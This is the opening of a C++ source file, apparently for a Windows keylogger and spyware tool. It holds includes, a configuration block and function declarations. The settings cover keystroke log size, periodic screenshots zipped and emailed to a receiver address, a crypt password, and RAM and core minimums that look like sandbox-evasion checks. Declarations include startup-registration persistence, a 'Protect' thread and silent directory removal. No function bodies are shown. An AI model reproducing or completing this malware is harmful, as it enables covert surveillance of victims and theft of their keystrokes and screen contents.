#define VC_EXTRALEAN
#ifdef UNICODE
	#undef UNICODE
#endif
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <vector>
#include <wininet.h>
#include <iostream>
#include <string>
#include <fstream>
#include <VersionHelpers.h>
#include <slpublic.h>
#include <tlhelp32.h>
#include <algorithm>
#include <iterator>
#include <memory>
#include <set>
#include <vector>
#include <comdef.h>
#include <comutil.h>
#include <Shldisp.h>
#include <shellapi.h>
#include <time.h>
#include <taskschd.h>
#include <assert.h>
#include <intrin.h>
#include <array>

#include "log.h"



using buffer = std::vector<char>;

//------------------------------------------------------
// Customization

#define CharactersPerLog 300
#define MaximumFolderSize 10 
#define RequiredRam 2048 //MB
#define RequiredCores 2 
#define CryptPassword "MyPassword" 
#define BaseShiftValue 100 //base int to add to chars for crypting measures
#define SecondsBetweenScreenshots 20
#define ScreenshotsPerZip 4
#define SendersEmail ""
#define SendersPsw ""
#define RecieversEmail ""

//------------------------------------------------------

#define MAX_LENGTH 1024


#define WINDOWS_SLID                                                \
            { 0x55c92734,                                           \
              0xd682,                                               \
              0x4d71,                                               \
            { 0x98, 0x3e, 0xd6, 0xec, 0x3f, 0x16, 0x05, 0x9f   }    \
}


#pragma comment(lib, "Wininet.lib")
#pragma comment(lib, "Slwga.lib")
#pragma comment( lib, "comsuppw.lib" )
//#pragma comment(lib, "Wbemuuid.lib.")

#define debug

#define _WIN32_WINNT 0x050

extern "C" int RandomGenerator();
int SilentlyRemoveDirectory(const char* dir);
//ULONG WINAPI ScreenGrabber(LPVOID Parameter);
int CalculateDirSize(std::string DirectoryToCheck);
BOOL RegisterMyProgramForStartup(PCSTR pszAppName, PCSTR pathToExe, PCSTR args);
ULONG WINAPI Protect(LPVOID);
std::string GetCpuInfo();
BOOL SaveHBITMAPToFile(HBITMAP hBitmap, LPCTSTR lpszFileName);
ULONG WINAPI ScreenGrabber(LPVOID Parameter);
void TakeScreenShot(const char* filename);
bool fexists(const std::string& filename);                          //create native check through CreateFileA()
void FinalExit();
//void Compress(const buffer& in, buffer& out);



typedef std::string String;
typedef std::vector<String> StringVector;
typedef unsigned long long uint64_t;
